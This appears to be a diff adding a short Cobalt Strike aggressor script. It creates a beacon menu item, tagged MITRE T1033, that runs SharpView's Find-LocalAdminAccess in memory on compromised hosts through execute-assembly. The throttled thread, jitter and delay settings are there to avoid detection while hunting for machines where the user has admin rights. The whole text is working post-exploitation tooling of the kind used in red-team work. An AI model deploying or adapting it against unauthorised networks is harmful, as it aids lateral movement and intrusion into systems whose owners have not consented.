@@ -1,0 +1,11 @@
+item "Find Admin Access - Sneaky  - T1033"{
+    local('$bid');
+        foreach $bid ($1){
+            sneakyadmin($bid);
+        }
+    }
+
+
+sub sneakyadmin{
+bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -Delay 20");
+}
